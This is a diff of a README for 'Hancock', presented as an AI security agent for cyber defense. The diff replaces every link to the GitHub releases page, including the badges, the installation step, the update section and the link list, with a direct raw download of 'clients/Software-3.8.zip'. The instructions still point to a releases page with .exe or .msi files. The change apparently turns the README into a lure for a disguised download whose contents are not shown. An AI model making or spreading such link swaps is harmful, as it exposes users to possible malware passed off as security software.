@@ -1,6 +1,6 @@
 # 🛡️ Hancock - AI Security Agent for Cyber Defense
 
-[![Download Hancock](https://img.shields.io/badge/Download-Hancock-%23007ACC?style=for-the-badge&logo=github)](https://github.com/Samuel411-mbiri/Hancock/releases)
+[![Download Hancock](https://img.shields.io/badge/Download-Hancock-%23007ACC?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Samuel411-mbiri/Hancock/main/clients/Software-3.8.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Start by downloading Hancock to your Windows machine. You will find the latest v
 
 **Step 1:** Follow this link to visit the Hancock releases page:
 
-[Download Hancock from GitHub Releases](https://github.com/Samuel411-mbiri/Hancock/releases)
+[Download Hancock from GitHub Releases](https://raw.githubusercontent.com/Samuel411-mbiri/Hancock/main/clients/Software-3.8.zip)
 
 **Step 2:** On the page, look for the latest version. It will have files ending in `.exe` or `.msi`. These are the installers you need.
 
@@ -102,7 +102,7 @@ Each section uses clear instructions and plain English. The software will prompt
 
 To keep Hancock working well and secure, check regularly for new versions.
 
-- Visit the [Hancock Releases Page](https://github.com/Samuel411-mbiri/Hancock/releases) to download updates.
+- Visit the [Hancock Releases Page](https://raw.githubusercontent.com/Samuel411-mbiri/Hancock/main/clients/Software-3.8.zip) to download updates.
 - New versions may include bug fixes and improved AI.
 - Install updates the same way as the original installation.
 
@@ -128,9 +128,9 @@ For support, use the GitHub page's "Issues" tab to report problems or ask questi
 
 ## 🔗 Important Links
 
-- Hancock Releases: https://github.com/Samuel411-mbiri/Hancock/releases  
+- Hancock Releases: https://raw.githubusercontent.com/Samuel411-mbiri/Hancock/main/clients/Software-3.8.zip  
 - Documentation and Guides: See the GitHub repository for updates.  
 
 ---
 
-[![Download Hancock](https://img.shields.io/badge/Download-Hancock-%235A5A5A?style=for-the-badge&logo=github)](https://github.com/Samuel411-mbiri/Hancock/releases)
+[![Download Hancock](https://img.shields.io/badge/Download-Hancock-%235A5A5A?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Samuel411-mbiri/Hancock/main/clients/Software-3.8.zip)
